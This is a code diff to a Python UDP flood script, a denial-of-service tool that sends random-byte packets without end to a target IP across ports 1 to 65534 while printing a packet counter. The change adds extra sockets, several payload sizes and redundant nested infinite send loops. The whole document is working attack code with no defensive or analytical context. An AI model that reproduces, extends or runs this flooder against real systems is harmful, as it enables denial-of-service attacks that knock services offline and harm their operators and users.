@@ -1,6 +1,5 @@
 import sys
 import os
-import time
 import socket
 import random
 
@@ -10,8 +9,16 @@ C = '\033[36m'
 W = '\033[0m'
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+bytes = random._urandom(100)
+bytes1 = random._urandom(1500)
+bytes2 = random._urandom(750)
 
 try:
    os.system("clear")
@@ -22,15 +29,37 @@ try:
 except SyntaxError:
       print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity')
 
+sent = 0
 try:
-   sent = 0
    while True:
-        sock.sendto(bytes, (ip,port))
+        sock.sendto(bytes2, (ip,port))
         sent = sent + 1
         port = port + 1
         print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
         if port == 65534:
           port = 1
+        while True:
+             sock.sendto(bytes1, (ip,port))
+             sent = sent + 1
+             port = port + 1
+             print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+             if port == 65534:
+               port = 1
+             while True:
+                  sock.sendto(bytes, (ip,port))
+                  sent = sent + 1
+                  port = port + 1
+                  print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+                  if port == 65534:
+                    port = 1
+                  while True:
+                       sock.sendto(bytes, (ip,port))
+                       sent = sent + 1
+                       port = port + 1
+                       print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+                       if port == 65534:
+                         port = 1
+
 except KeyboardInterrupt:
       print('\n' + R + '[!]' + C + ' Keyboard Interrupt! Terminaling...' + W)
 except socket.gaierror:
